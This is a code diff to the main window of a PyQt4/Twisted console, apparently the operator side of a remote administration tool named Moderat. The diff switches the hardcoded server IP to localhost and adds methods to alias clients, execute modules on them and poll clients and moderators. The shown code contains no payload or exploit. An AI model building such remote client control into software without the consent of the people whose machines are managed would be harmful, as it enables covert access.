@@ -2,8 +2,6 @@
 
 import sys
 import os
-import string
-import random
 
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
@@ -16,13 +14,14 @@ from libs.moderat.Modes import Modes
 from libs.gui import triggers
 from ui import gui
 
-SERVER_HOST = '109.172.189.74'
-#SERVER_HOST = '127.0.0.1'
+#SERVER_HOST = '109.172.189.74'
+SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 1313
 
 # Multi Lang
 translate = Translate()
 _ = lambda _word: translate.word(_word)
+
 
 # Main Window
 class MainDialog(QMainWindow, gui.Ui_MainWindow):
@@ -40,6 +39,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.session_id = None
         # Privileges
         self.privs = 0
+        # Checkers
+        self.moderators_checker = None
+        self.clients_checker = None
+        # Modules Bank
+        self.modulesBank = {}
 
         # Create Protocol
         self.create_moderator()
@@ -58,35 +62,80 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     # Start Connect To Server
     def on_connect_to_server(self):
-    	print 'connected'
+        '''
+        Try Connect To Server
+        :return:
+        '''
         self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)
 
-    # Connected To Server
     def on_moderator_connect_success(self):
+        '''
+        On Moderator Connected To Server
+        :return:
+        '''
         self.action.login()
 
-    # Disconnected From Server
     def on_moderator_connect_fail(self, reason):
-        # reason is a twisted.python.failure.Failure  object
-        print 'disconnected'
-        print 'cann\'t connect. reason: %s' % reason
+        '''
+        On Moderator Disconnected From Server
+        :param reason:
+        :return:
+        '''
+        self.action.disconnect()
 
     # Callbacks
     def on_moderator_receive(self, data):
+        '''
+        Data Received From Server
+        :param data:
+        :return:
+        '''
         self.modes.check_mode(data)
 
     def set_alias(self):
-    	self.action.set_alias()
+        '''
+        Set Alias For Client
+        :return:
+        '''
+        self.action.set_alias()
 
-    # Check Clients For Updates
+    def execute_module(self, module):
+        '''
+        execute module
+        :param module:
+        :return:
+        '''
+        self.action.execute_module(module)
+
     def check_clients(self):
+        '''
+        Update Clients Information
+        :return:
+        '''
         self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)
 
- 	def check_moderators(self):
- 		print 'aq'
- 		self.moderator.send_msg(message='getModerators', mode='getModerators', session_id=self.session_id)
+    def check_moderators(self):
+        '''
+        Update Moderators Information
+        :return:
+        '''
+        self.moderator.send_msg(message='getModerators', mode='getModerators', session_id=self.session_id)
 
-#-------------------------------------------------------------------------------
+    def send_signal(self, data):
+        if self.modulesBank.has_key(data['module_id']):
+            self.modulesBank[data['module_id']].signal(data)
+
+    def closeEvent(self, *args, **kwargs):
+        '''
+        Moderat Close Event Detected
+        :param args:
+        :param kwargs:
+        :return:
+        '''
+        self.action.close_moderat()
+
+
+# -------------------------------------------------------------------------------
 if __name__ == "__main__":
     app = QApplication(sys.argv)
     try:
@@ -96,6 +145,7 @@ if __name__ == "__main__":
     qt4reactor.install()
 
     from twisted.internet import reactor
+
     moderatWindow = MainDialog(reactor)
     moderatWindow.show()
 
